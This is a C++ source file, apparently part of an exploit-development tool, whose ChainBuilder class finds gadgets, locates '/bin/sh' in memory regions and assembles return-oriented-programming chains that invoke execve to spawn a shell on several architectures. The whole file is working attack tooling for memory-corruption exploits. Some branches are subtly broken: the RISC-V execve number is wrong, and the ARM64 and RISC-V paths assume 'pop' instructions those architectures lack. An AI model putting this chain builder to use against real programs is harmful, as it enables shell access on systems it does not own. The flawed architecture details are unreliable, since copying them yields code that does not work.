#include "chain_builder.h"
#include "utils.h"
#include <iostream>
#include <iomanip>
#include <stdexcept>
#include <algorithm>
#include <map>
#include <optional>
#include <fstream>
#include <vector>

// ANSI escape codes for coloring
#define ANSI_COLOR_GREEN   "\x1b[32m"
#define ANSI_COLOR_ORANGE  "\033[33m"
#define ANSI_COLOR_CYAN    "\x1b[36m"
#define ANSI_COLOR_RESET   "\x1b[0m"

ChainBuilder::ChainBuilder(const std::vector<Gadget>& gadgets, const std::string& arch)
    : rop_gadgets(gadgets), m_arch(arch) {}

// Find a gadget with a specific instruction and a return
std::optional<Gadget> ChainBuilder::findOptimalPopGadget(const std::string& reg) {
    // 1. First priority: exact 2-instruction gadget: "pop <reg> ; ret"
    for (const auto& g : rop_gadgets) {
        if (g.instructions.size() == 2 && 
            g.instructions[0].mnemonic == "pop" && 
            g.instructions[0].op_str == reg &&
            (g.instructions[1].mnemonic == "ret" || g.instructions[1].mnemonic == "retf")) {
            Gadget res = g;
            res.target_register = reg;
            if (res.assembly.empty()) res.assembly = "pop " + reg + " ; ret";
            return res;
        }
    }

    // 2. Second priority: any clean gadget ending with ret where pop <reg> is present, smallest size
    const Gadget* best_candidate = nullptr;
    for (const auto& g : rop_gadgets) {
        if (g.instructions.size() < 2) continue;
        if (!g.isTerminator()) continue;

        for (size_t i = 0; i < g.instructions.size() - 1; ++i) {
            if (g.instructions[i].mnemonic == "pop" && g.instructions[i].op_str == reg) {
                if (!best_candidate || g.instructions.size() < best_candidate->instructions.size()) {
                    best_candidate = &g;
                }
            }
        }
    }
    if (best_candidate) {
        Gadget res = *best_candidate;
        res.target_register = reg;
        return res;
    }

    // 3. Fallback substring search
    std::string pop_instruction = "pop " + reg + " ; ret";
    for (const auto& g : rop_gadgets) {
        if (g.toString().find(pop_instruction) != std::string::npos) {
            Gadget res = g;
            res.target_register = reg;
            return res;
        }
    }
    return std::nullopt;
}

std::optional<Gadget> ChainBuilder::findSpecificGadget(const std::string& instruction) {
    // For syscall, sysenter, int 0x80, svc #0, ecall - look for exact instruction
    if (instruction == "syscall" || instruction == "sysenter" || instruction == "int 0x80" || 
        instruction == "svc #0" || instruction == "ecall") {
        
        // Exact 1-instruction match (e.g. standalone syscall)
        for (const auto& g : rop_gadgets) {
            if (g.instructions.size() == 1) {
                std::string full_insn = g.instructions[0].mnemonic;
                if (!g.instructions[0].op_str.empty()) full_insn += " " + g.instructions[0].op_str;
                if (full_insn == instruction || g.instructions[0].mnemonic == instruction) {
                    Gadget res = g;
                    if (res.assembly.empty()) res.assembly = instruction;
                    return res;
                }
            }
        }

        // Gadget ending with the target instruction
        for (const auto& g : rop_gadgets) {
            if (!g.instructions.empty()) {
                std::string full_insn = g.instructions.back().mnemonic;
                if (!g.instructions.back().op_str.empty()) full_insn += " " + g.instructions.back().op_str;
                if (full_insn == instruction || g.instructions.back().mnemonic == instruction) {
                    Gadget res = g;
                    if (res.assembly.empty()) res.assembly = instruction;
                    return res;
                }
            }
        }
    }

    // Gadget containing target instruction that terminates
    for (const auto& g : rop_gadgets) {
        if (g.toString().find(instruction) != std::string::npos) {
            return g;
        }
    }
    return std::nullopt;
}

uint64_t ChainBuilder::findBinShAddress(const std::vector<MemoryRegion>& memoryRegions) {
    for (const auto& region : memoryRegions) {
        std::ifstream file(region.path, std::ios::binary);
        if (!file) {
            std::cerr << "Warning: Could not open file " << region.path << std::endl;
            continue;
        }

        file.seekg(0, std::ios::end);
        size_t fileSize = file.tellg();
        file.seekg(0, std::ios::beg);
        std::vector<char> buffer(fileSize);
        file.read(buffer.data(), fileSize);

        std::string target = "/bin/sh";
        auto pos = std::search(buffer.begin(), buffer.end(), target.begin(), target.end());

        if (pos != buffer.end()) {
            size_t offset = std::distance(buffer.begin(), pos);
            return region.start + offset;
        }
    }
    return 0;
}

ROPChain ChainBuilder::buildExecveChainInternal(uint64_t binsh_addr) {
    ROPChain chain;

    if (m_arch == "x86_64") {
        auto pop_rdi_gadget = findOptimalPopGadget("rdi");
        auto pop_rsi_gadget = findOptimalPopGadget("rsi");
        auto pop_rdx_gadget = findOptimalPopGadget("rdx");
        auto pop_rax_gadget = findOptimalPopGadget("rax");
        auto syscall_gadget = findSpecificGadget("syscall");

        if (pop_rdi_gadget && pop_rsi_gadget && pop_rdx_gadget && pop_rax_gadget && syscall_gadget) {
            chain.add_step(*pop_rdi_gadget, binsh_addr, "Set RDI to /bin/sh address");
            chain.add_step(*pop_rsi_gadget, 0, "Set RSI to 0");
            chain.add_step(*pop_rdx_gadget, 0, "Set RDX to 0");
            chain.add_step(*pop_rax_gadget, 59, "Set RAX to syscall number 59 (execve)");
            chain.add_step(*syscall_gadget, "Invoke execve syscall");
            return chain;
        }
    } else if (m_arch == "x86") {
        auto pop_eax_gadget = findOptimalPopGadget("eax");
        auto pop_ebx_gadget = findOptimalPopGadget("ebx");
        auto pop_ecx_gadget = findOptimalPopGadget("ecx");
        auto pop_edx_gadget = findOptimalPopGadget("edx");
        auto int80_gadget = findSpecificGadget("int 0x80");

        if (pop_eax_gadget && pop_ebx_gadget && pop_ecx_gadget && pop_edx_gadget && int80_gadget) {
            chain.add_step(*pop_eax_gadget, 11, "Set EAX to syscall number 11 (execve)");
            chain.add_step(*pop_ebx_gadget, binsh_addr, "Set EBX to /bin/sh address");
            chain.add_step(*pop_ecx_gadget, 0, "Set ECX to 0");
            chain.add_step(*pop_edx_gadget, 0, "Set EDX to 0");
            chain.add_step(*int80_gadget, "Invoke int 0x80");
            return chain;
        }
    } else if (m_arch == "aarch64" || m_arch == "arm64") {
        auto pop_x0_gadget = findOptimalPopGadget("x0");
        auto pop_x1_gadget = findOptimalPopGadget("x1");
        auto pop_x2_gadget = findOptimalPopGadget("x2");
        auto pop_x8_gadget = findOptimalPopGadget("x8");
        auto svc_gadget = findSpecificGadget("svc #0");

        if (pop_x0_gadget && pop_x1_gadget && pop_x2_gadget && pop_x8_gadget && svc_gadget) {
            chain.add_step(*pop_x0_gadget, binsh_addr, "Set X0 to /bin/sh address");
            chain.add_step(*pop_x1_gadget, 0, "Set X1 to 0");
            chain.add_step(*pop_x2_gadget, 0, "Set X2 to 0");
            chain.add_step(*pop_x8_gadget, 221, "Set X8 to syscall number 221 (execve)");
            chain.add_step(*svc_gadget, "Invoke execve syscall");
            return chain;
        }
    } else if (m_arch == "armv7" || m_arch == "arm") {
        auto pop_r0_gadget = findOptimalPopGadget("r0");
        auto pop_r1_gadget = findOptimalPopGadget("r1");
        auto pop_r2_gadget = findOptimalPopGadget("r2");
        auto pop_r7_gadget = findOptimalPopGadget("r7");
        auto svc_gadget = findSpecificGadget("svc #0");

        if (pop_r0_gadget && pop_r1_gadget && pop_r2_gadget && pop_r7_gadget && svc_gadget) {
            chain.add_step(*pop_r0_gadget, binsh_addr, "Set R0 to /bin/sh address");
            chain.add_step(*pop_r1_gadget, 0, "Set R1 to 0");
            chain.add_step(*pop_r2_gadget, 0, "Set R2 to 0");
            chain.add_step(*pop_r7_gadget, 11, "Set R7 to syscall number 11 (execve)");
            chain.add_step(*svc_gadget, "Invoke execve syscall");
            return chain;
        }
    } else if (m_arch == "riscv" || m_arch == "riscv32" || m_arch == "riscv64") {
        auto pop_a0_gadget = findOptimalPopGadget("a0");
        auto pop_a1_gadget = findOptimalPopGadget("a1");
        auto pop_a2_gadget = findOptimalPopGadget("a2");
        auto pop_a7_gadget = findOptimalPopGadget("a7");
        auto ecall_gadget = findSpecificGadget("ecall");

        if (pop_a0_gadget && pop_a1_gadget && pop_a2_gadget && pop_a7_gadget && ecall_gadget) {
            chain.add_step(*pop_a0_gadget, binsh_addr, "Set A0 to /bin/sh address");
            chain.add_step(*pop_a1_gadget, 0, "Set A1 to 0");
            chain.add_step(*pop_a2_gadget, 0, "Set A2 to 0");
            chain.add_step(*pop_a7_gadget, 103, "Set A7 to syscall number 103 (execve)");
            chain.add_step(*ecall_gadget, "Invoke ecall");
            return chain;
        }
    }

    throw std::runtime_error("Could not build execve chain. Missing required gadgets.");
}

ROPChain ChainBuilder::buildExecveChain(const std::vector<MemoryRegion>& memoryRegions) {
    uint64_t addr = findBinShAddress(memoryRegions);
    return buildExecveChainInternal(addr);
}

ROPChain ChainBuilder::buildExecveChain(uint64_t binsh_addr) {
    return buildExecveChainInternal(binsh_addr);
}
